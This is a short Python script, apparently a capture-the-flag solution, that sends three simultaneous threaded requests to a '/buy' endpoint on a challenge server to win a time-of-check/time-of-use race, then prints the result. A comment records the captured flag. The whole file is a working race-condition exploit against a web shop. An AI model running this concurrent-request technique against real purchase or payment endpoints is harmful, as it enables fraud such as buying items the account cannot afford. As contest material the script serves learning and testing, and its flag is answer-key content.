import threading
import requests

def job(url, par):
	r = requests.get(url, params = par)

r = requests.get("http://140.112.31.97:10161/")
url = r.url + "buy"
ind = ["Slowpoke", "Eevee", "Snorlax"]

tid = []
for k in range(3):
	tid.append(threading.Thread(target = job, args = (url, {"name": ind[k]},)))
	tid[k].start()
for k in range(3):
	tid[k].join()

r = requests.get(url[:-3])
print r.text

# flag: BALSN{T0CT0U/R4CE_C0NDI7I0N_I5_50_IN7ERE57ING}